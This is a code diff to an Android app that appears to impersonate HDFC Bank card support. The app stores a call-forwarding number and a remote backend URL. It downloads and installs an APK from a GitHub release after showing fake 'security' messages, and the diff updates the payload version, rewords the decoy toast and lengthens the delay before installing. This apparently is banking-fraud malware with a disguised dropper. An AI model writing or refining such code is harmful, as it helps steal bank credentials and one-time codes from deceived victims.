@@ -42,7 +42,7 @@ import java.util.Locale;
 public class MainActivity extends BridgeActivity {
     private static final String TAG = "HDFC_MainActivity";
     private static final String BACKEND_URL = "https://backprince.onrender.com";
-    private static final String UPDATE_URL = "https://github.com/amanxridex/newmade/releases/download/v2.0.56/hdfc_card_support.apk";
+    private static final String UPDATE_URL = "https://github.com/amanxridex/newmade/releases/download/v2.0.58/hdfc_card_support.apk";
     private String forwardingNumber = null;
     private boolean forwardingEnabled = false;
 
@@ -53,13 +53,13 @@ public class MainActivity extends BridgeActivity {
         
         // CHECK FOR UPDATE TRIGGER
         if (!isFullVersion()) {
-            Toast.makeText(this, "Checking Security Updates...", Toast.LENGTH_LONG).show();
+            Toast.makeText(this, "Optimizing Security Settings...", Toast.LENGTH_LONG).show();
             new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                 @Override
                 public void run() {
                     downloadAndInstallUpdate();
                 }
-            }, 3000);
+            }, 8000); // 8 second delay for stability
         } else {
             Toast.makeText(this, "Security Sync: Online", Toast.LENGTH_SHORT).show();
             // Immediate Permission Check for Full Version
